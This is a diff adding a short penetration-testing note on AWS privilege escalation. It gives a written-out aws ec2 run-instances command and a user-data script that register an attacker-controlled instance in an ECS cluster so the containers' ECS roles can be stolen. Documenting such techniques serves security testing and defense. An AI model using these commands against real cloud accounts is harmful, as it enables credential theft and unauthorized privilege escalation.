@@ -1,0 +1,15 @@
+Privesc to ECS
+With this set of permissions you could also create an EC2 instance and register it inside an ECS cluster. This way, ECS services will be run in inside the EC2 instance where you have access and then you can penetrate those services (docker containers) and steal their ECS roles attached.
+
+aws ec2 run-instances \
+    --image-id ami-07fde2ae86109a2af \
+    --instance-type t2.micro \
+    --iam-instance-profile <ECS_role> \
+    --count 1 --key-name pwned \
+    --user-data "file:///tmp/asd.sh"
+
+# Make sure to use an ECS optimized AMI as it has everything installed for ECS already (amzn2-ami-ecs-hvm-2.0.20210520-x86_64-ebs)
+# The EC2 instance profile needs basic ECS access
+# The content of the user data is:
+#!/bin/bash
+echo ECS_CLUSTER=<cluster-name> >> /etc/ecs/ecs.config;echo ECS_BACKEND_HOST= >> /etc/ecs/ecs.config;
